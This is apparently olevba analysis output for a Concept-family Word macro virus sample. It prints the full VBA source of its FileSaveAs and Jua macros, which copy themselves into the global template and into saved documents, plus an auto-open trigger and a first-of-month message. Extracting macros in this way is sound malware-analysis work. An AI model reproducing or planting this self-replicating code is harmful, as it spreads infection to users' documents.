olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept.cm-6ea835350f0a028836710506b6fad16b4e47f014
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept.cm-6ea835350f0a028836710506b6fad16b4e47f014 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Concept.cm-6ea835350f0a028836710506b6fad16b4e47f014 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Joea.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Bali
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy "Global:Jua", sMacro$
sMacro$ = sMe$ + ":Joea"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
If WordBasic.Day(WordBasic.Now()) = 1 Then
WordBasic.MsgBox "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
End If
WordBasic.FileSaveAs dlg
GoTo Done
Bali:
If Err.Number <> 102 Then
WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Jua.bas 
in file: Virus.MSWord.Concept.cm-6ea835350f0a028836710506b6fad16b4e47f014 - OLE stream: 'Macros/VBA/Jua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs aUTOOpenScan"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.aUTOOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Bail
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":Joea"
WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
sMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy sMacro$, "Global:Jua"
If WordBasic.Day(WordBasic.Now()) = 1 Then
WordBasic.MsgBox "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
End If
Bail:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

